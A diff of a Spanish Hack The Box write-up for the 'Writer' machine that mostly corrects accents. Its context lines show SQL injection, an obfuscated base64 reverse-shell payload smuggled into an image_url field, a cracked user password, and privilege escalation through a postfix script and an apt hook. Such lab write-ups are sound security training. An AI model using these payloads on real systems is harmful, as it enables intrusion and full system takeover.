@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Writer - Hack The Box
-excerpt: "Writer es una caja ctf linux con dificultad calificada como media en la plataforma hackthebox.La maquia cubre la vilnerabilidad de inyeccion sql y la escalada de privilegios mediante smtp"
+excerpt: "Writer es una caja ctf linux con dificultad calificada como media en la plataforma hackthebox.La maquia cubre la vilnerabilidad de inyección sql y la escalada de privilegios mediante smtp"
 date: 2022-09-03
 classes: wide
 header:
@@ -61,13 +61,13 @@ Nmap done: 1 IP address (1 host up) scanned in 21.41 seconds
 Aplicamos fuzzing y encontramos lo siguiente.
 ![](/assets/images/htb-writeup-writer/Fuzzer.png)
 
-Nos dirijimos hacia Administrative y nos encontramos un panel de login, probamos una inyeccion tipica y logramos entrar.
+Nos dirijimos hacia Administrative y nos encontramos un panel de login, probamos una inyección tipica y logramos entrar.
 
 
 ![](/assets/images/htb-writeup-writer/Inyeccion-panel-de-login.png)
 
 ## Inyeccion
-En el panel de login probamos una inyeccion de tipo union based, y inspeccionamos el codigo fuente antes que se haga el redirect, y vemos que al lado de admin se refleja un 2.
+En el panel de login probamos una inyección de tipo unión based, y inspeccionamos el código fuente antes que se haga el redirect, y vemos que al lado de admin se refleja un 2.
 ![](/assets/images/htb-writeup-writer/Probamos-una-inyeccion-union-based.png)
 
  Nos creamos un script en python3. 
@@ -90,23 +90,23 @@ if __name__ == '__main__':
 ![](/assets/images/htb-writeup-writer/Enumerando-1-por-1-tablas.png)
 
 
- Extraemos un username y una password, y algunas cosas mas, pero dicha informacion no es util.
+ Extraemos un username y una password, y algunas cosas más, pero dicha información no es útil.
 
 
 ![](/assets/images/htb-writeup-writer/Extraemos-username-password.png)
 
 
- Por una extraña razon no podemos leer archivos mediante nuestro script, procedemos a usar burpsuite, sacamos la ruta de los archivos de la pagina a traves del /etc/apache2/sites-enabled/000-default.conf
+ Por una extraña razón no podemos leer archivos mediante nuestro script, procedemos a usar burpsuite, sacamos la ruta de los archivos de la página a través del /etc/apache2/sites-enabled/000-default.conf
 
- Intuimos que esta corriendo flask y buscamos el __init__.py , aplicamos una expresion regular para que todo quede mas lindo.
+ Intuimos que está corriendo flask y buscamos el __init__.py , aplicamos una expresión regular para que todo quede más prolijo.
 
 
 ![](/assets/images/htb-writeup-writer/initt.png)
 
- Ahora empezamos a buscar vias de acceso para ejecutar una ejecucion de comandos, y encontramos lo siguiente.
+ Ahora empezamos a buscar vías de acceso para aplicar una ejecución de comandos, y encontramos lo siguiente.
 ![](/assets/images/htb-writeup-writer/via-para-ejecutar-comando.png)
 
- Entendemos como esta gesteonando la subida de una imagen a la web entonces procedemos a ser lo siguiente.
+ Entendemos como está gestionando la subida de una imagen a la web entonces procedemos a ser lo siguiente.
 1. Ingresamos a la web, y subimos un archivo desde ella
 2. Luego desde image_url indicamos con un wrapper a dicho archivo en este caso 
    file:///var/www/writer.htb/writer/static/img/pwned.jpg;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzQ0MyAwPiYxCg==|base64 -d|bash;
@@ -120,23 +120,23 @@ if __name__ == '__main__':
 
 ##  Elevacion de Privilegios
 
- Cuando entramos en el sistema nos dirijimos a writer2_project y vemos un archivo manager.py, gracias a este archivo podemos acceder a la base de datos de forma automatica.
+Cuando entramos en el sistema nos dirijimos a writer2_project y vemos un archivo manager.py, gracias a este archivo podemos acceder a la base de datos de forma automática.
 ![](/assets/images/htb-writeup-writer/accediendo-a-la-base-de-datos.png)
 
- Obtenemos un hash y procedemos a crackearlo. Nos da una password que es la del usuario kyle.Nos logiamos como dicho usuario.
+Obtenemos un hash y procedemos a crackearlo. Nos da una password que es la del usuario kyle.Nos logiamos como dicho usuario.
 ```bash
 www-data@writer:/var/www/writer2_project$ su kyle 
 Password: marcoantonio
 kyle@writer:/var/www/writer2_project$
 ```
- Vemos a que grupo pertenece
+Vemos a que grupo pertenece
 
 
 ![](/assets/images/htb-writeup-writer/grupo-que-pertenece.png)
 
- Al parece esta ejecutando el script /etc/postfix/disclaimer como john para recibir correos electrónicos.Podemos escribir en este script:
+Al parece esta ejecutando el script /etc/postfix/disclaimer como john para recibir correos electrónicos.Podemos escribir en este script:
 
- Vemos este script que esta relacionado a envio de correos, entonces empezamos a probar cosas.
+Vemos este script que esta relacionado a envío de correos, entonces empezamos a probar cosas.
 
 ```bash
 #!/bin/sh
@@ -266,7 +266,7 @@ Monitorizamos procesos con el pspy y nos encontramos lo siguiente.
 2022/09/05 13:52:01 CMD: UID=33   PID=56643  | /usr/bin/python3 mana
 
 ```
-El usuario root hace un apt-get update, procedimos a encontrar vias de explotacion a dicho apt-get.Segun el articulo si subimos un archivo modificado a /etc/apt/apt.conf.d/ podemos ejecutar un comando.Y pum tenemoms acceso como root.
+El usuario root hace un apt-get update, procedimos a encontrar vías de explótacion a dicho apt-get.Según el artículo si subimos un archivo modificado a /etc/apt/apt.conf.d/ podemos ejecutar un comando.Y pum tenemoms acceso como root.
 
 
 ![](/assets/images/htb-writeup-writer/apt-config-d.png)
